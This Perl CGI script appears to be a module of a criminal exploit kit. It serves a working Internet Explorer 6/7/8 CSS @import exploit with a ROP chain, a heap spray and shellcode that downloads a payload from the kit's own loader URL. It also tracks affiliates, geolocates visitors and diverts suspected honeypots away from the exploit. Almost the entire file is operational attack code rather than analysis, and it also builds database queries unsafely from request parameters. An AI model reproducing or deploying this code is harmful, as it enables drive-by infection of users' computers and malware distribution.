#!/usr/bin/perl

#
# MS11-XXX IE CSS Import exploit
# TESTED on ie 6/7/8 (WORKING)
#

use CGI;
use DBI;
use Encode;
use Geo::IP;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$os_flav = $q->param('flavor');
$cssornot = $q->param('url');
$csname = $q->param('csname');

#get the cookie value from name
$theCookie = $q->cookie($csname);

########### HoneyPot Function to test ################
$theip = $ENV{REMOTE_ADDR};
$referer = $ENV{HTTP_REFERER};

#IP to Country
$gi = Geo::IP->open( '../dep/GeoIP.dat' );
my $country = $gi->country_code_by_addr($theip);

#Convert IP for database
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$doubleip = "";
$verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
if($verifdoubleipch eq "")
{
  #Insert the system stats and check if the IP already exist
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'ms11_xxx.pl', 'HoneyPot')";
  $statement = $dbh->prepare($sql);
  $statement->execute() or $doubleip = 1;
  $doubleip = 1;
}
else
{
  $doubleip = 1;
}

######################################

if($doubleip eq "1")
{

  $checkvalueavs = "";
  #Check if ip equal to HoneyPot in database (not serving the exploit in this case)
  $checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");

if($checkvalueavs eq 'HoneyPot')
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{

#get browser version to dispatch hex value
$useragent = $ENV{HTTP_USER_AGENT};
$useragent =~ tr/[A-Z]/[a-z]/;

$uaname = 'MSIE' if($useragent =~ "msie");
if($uaname eq 'MSIE') #IE
{
  $uacheckie = $useragent;
  $uacheckie =~ /msie (.*?);/g;
  $uaver = $1;
}
$browserver = $uaver;

#get the cookie value from name
$theCookie = $q->cookie($csname);

#Exploitation vars
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=ms11_xxx';
if($os_flav eq '7')
{
  $shellcode = Shellcode::pdfgetshell3($urlllll);
}
else
{
  $shellcode = Shellcode::pdfgetshell($urlllll);
}

$shell_length = length($shellcode);


if($browserver eq '8.0')
{
  $Ret = 0x105ae020;
  $OnePtrOff = 0x18;
  $DerefOff = 0x30;
  $FlagOff = 0x54;
  $CallDeref1 = 0x20;
  $SignedOff = 0x1c;
  $CallDeref2 = 0x24;
  $CallDeref3 = 0x00;
  $CallDeref4 = 0x20;
  $Deref4Off = 0x08;
}

if($browserver eq '7.0')
{
  $Ret => 0x105ae020;
  $OnePtrOff = 0x14;
  $DerefOff = 0x5c;
  $FlagOff = 0x34;
  $CallDeref1 = 0x1c;
  $SignedOff = 0x18;
  $CallDeref2 = 0x20;
  $CallDeref3 = 0x00;
  $CallDeref4 = 0x20;
  $Deref4Off = 0x08;
}

if($browserver eq '6.0')
{
  $Ret = 0xc0c0c0c0;
  $OnePtrOff = 0x14;
  $DerefOff = 0x5c;
  $FlagOff = 0x34;
  $CallDeref1 = 0x1c;
  $SignedOff = 0x18;
  $CallDeref2 = 0x20;
  $CallDeref3 = 0x00;
  $CallDeref4 = 0x20;
  $Deref4Off = 0x08;
}


#Define vars
$buf_addr = $Ret;
$css_name = pack('V', $buf_addr) x 4;
$placeholder = "a" x (length($css_name) / 2);
$uni_placeholder = encode('UTF-16LE', $placeholder);


if($cssornot =~ 'dll')
{
  #make dll
  $urltodll = '../dep/generic-1296925738.dll';
  $dataload = "";
  open(FILE,"<$urltodll") || die "file cannot be openned $urltodll\n";
  while(<FILE>)
  {
    $dataload .= $_;
  }
  close(FILE);

  #send exe binary
  #print $q->header(-type=> 'application/x-msdownload');
  #print 'HTTP/1.1 200 OK' . "\n\n";
  print 'Content-Type: application/x-msdownload' . "\n\n";
  print 'Content-Length: 49152' . "\n\n";
  print "$dataload";
}
else
{
if($cssornot =~ 'css')
{
  $csscontent = '@import url("' . $placeholder . '");' . "\n";
  $csscontent .= '@import "' . $placeholder . '";' . "\n";
  $csscontent .= '@import url("' . $placeholder . '");' . "\n";
  $csscontent .= '@import "' . $placeholder . '";' . "\n";

  print $q->header(-type=> 'text/css');
  $cssunicode = "\xff\xfe" . encode('UTF-16LE', $csscontent);
  $cssunicode =~ s/$uni_placeholder/$css_name/g;
  print $cssunicode;
}
else
{
if($referer ne "")
{

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET ms11_xxx=ms11_xxx+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Insert the view param on exploit
$sql = "UPDATE exploits SET ms11_xxx=ms11_xxx+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Generate the ROP payload
$BaseAddress = 0x63f00000;
$rop_stack = generate_rop($buf_addr);
$fix_esp = $BaseAddress + 0x25e5;
$ret = $BaseAddress + 0x25e5 + 1;
$pivot1 = $BaseAddress + 0x237e;
$pivot2 = $BaseAddress + 0x575b;

#Append the payload to the rop_stack
$rop_stack .= $shellcode;

#Build the deref-fest buffer
$len = 0x84 + length($rop_stack);
$special_sauce = 'B' x $len; #generate_char($len);

#Generate Special Sauce
substr($special_sauce, $OnePtrOff, 4) = pack( 'V', 1);

# Pointer that is dereferenced to get the flag
substr($special_sauce, $DerefOff, 4) = pack( 'V', $buf_addr);

# Low byte must not have bit 1 set
$no_bit1 = rand(0xff) & ~2;
#print "\n\n$no_bit1\n\n";
substr($special_sauce, $FlagOff, 1) = pack('V', $no_bit1);

# These are deref'd to figure out what to call
substr($special_sauce, $CallDeref1, 4) = pack('V', $buf_addr);
substr($special_sauce, $CallDeref2, 4) = pack('V', $buf_addr);
$bufandder = $buf_addr + $Deref4Off;
substr($special_sauce, $CallDeref3, 4) = pack('V', $bufandder);
# Finally, this one becomes eip
substr($special_sauce, ($CallDeref4 + $Deref4Off), 4) = pack('V', $pivot1);

# This byte must be signed (shorter path to flow control)
$signed_byte = rand(0xff) | 0x80;
#print "\n\n$signed_byte\n\n";
substr($special_sauce, $SignedOff, 1) = pack('C', $signed_byte);

# These offsets become a fix_esp ret chain ..
substr($special_sauce, 0x04, 4) = pack('V', $pivot2);    # part two of our stack pivot!
$becebp = $buf_addr + 0x84 - 4;
substr($special_sauce, 0x0c, 4) = pack('V', $becebp);  # becomes ebp, for fix esp
substr($special_sauce, 0x10, 4) = pack('V', $fix_esp);   # our stack pivot ret's to this (fix_esp, from eax)

# Add in the rest of the ROP stack
$ropstack_len = length($rop_stack);
substr($special_sauce, 0x84, $ropstack_len) = $rop_stack;

# Format for javascript use
$uspecial_sauce = convert_sco($special_sauce);

$js_function  = generate_char(int(rand(100)+1));

#Construct the JS
$custom_js = <<EOS;
function $js_function() {
heap = new heapLib.ie(0x20000);
var heapspray = unescape("$uspecial_sauce");
while(heapspray.length < 0x1000) heapspray += unescape("%u4444");
var heapblock = heapspray;
while(heapblock.length < 0x40000) heapblock += heapblock;
finalspray = heapblock.substring(2, 0x40000 - 0x21);
for(var counter = 0; counter < 500; counter++) { heap.alloc(finalspray); }
var vlink = document.createElement("link");
vlink.setAttribute("rel", "Stylesheet");
vlink.setAttribute("type", "text/css");
vlink.setAttribute("href", "$placeholder")
document.getElementsByTagName("head")[0].appendChild(vlink);
}
EOS

#open the heaplib.js (thanks metasploit)
open(FILE,"<../dep/heaplib.js");
while(<FILE>)
{
  $data255 .= $_;
}

$js = $data255 . $custom_js;

$beforexoredd = EncRand::CsCrypt($js,$csname,$theCookie);
$beforexoredd = $js;

$dll_uri = 'generic.dll';

$html = <<EOF;
<html>
<head>
<script language='javascript'>
$beforexoredd
</script>
</head>
<body onload='$js_function()'>
<object classid="$dll_uri#GenericControl">
</body>
</html>
EOF

$htmlunicode = "\xff\xfe" . encode('UTF-16LE', $html);
$htmlunicode =~ s/$uni_placeholder/$css_name/g;

}
###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print $htmlunicode;

####### END PRINT EXPLOIT ##########
}
}
}
}
sub generate_rop
{
  $buf_addr = shift;
  $BaseAddress = 0x63f00000;
  $rop_stack = pack('V*', $BaseAddress + 0x1e13);
  $rop_stack .= pack('V*', $BaseAddress + 0x10f4);
  $rop_stack .= pack('V*', $BaseAddress + 0x1ec4);
  $rop_stack .= pack('V*', 0);
  $rop_stack .= pack('V*', 0x1000);
  $rop_stack .= pack('V*', 0x3000);
  $rop_stack .= pack('V*', 0x40);
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', $BaseAddress + 0x1e13);
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', $buf_addr + 0x84 + 0x54);
  $rop_stack .= pack('V*', $BaseAddress + 0x61f6);
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', $BaseAddress + 0x1d9a);
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', 0x42424242); #unused
  $rop_stack .= pack('V*', 0x42424242); #unused
  #$calculaterop = length($rop_stack);
  #$rop_stack .= pack('V*', $buf_addr + 0x84 + ($calculaterop * 4));
  $rop_stack .= pack('V*', $buf_addr + 0x2e0); #DEBUG DO NOT USE IN PRODUCTION MODE
  $rop_stack .= pack('V*', $BaseAddress + 0x2212);
  $rop_stack .= pack('V*', 0xdeadf00d);
  $rop_stack .= pack('V*', $BaseAddress + 0x6154) x (0x200 / 4);
  $rop_stack .= pack('V*', $BaseAddress + 0x1ec4);

  return $rop_stack;
}


sub generate_char()
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'f');
 my $wd = join '',
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;
}

sub hex_to_ascii ($)
{
	## Convert each two-digit hex number back to an ASCII character.
	(my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
	return $str;
}

sub ascii_to_hex ($)
{
	## Convert each ASCII character to a two-digit hex number.
	(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
	return $str;
}

sub convert_sco {
        my $data = shift;
        my $mode = shift() || 'LE';
        my $code = '';

        my $idx = 0;

        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx < length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                if ($mode eq 'LE') {
                        $code .= sprintf('%%u%.2x%.2x', $c2, $c1);
                } else {
                        $code .= sprintf('%%u%.2x%.2x', $c1, $c2);
                }
                $idx += 2;
        }

        return $code;
}

$dbh->disconnect();

1;
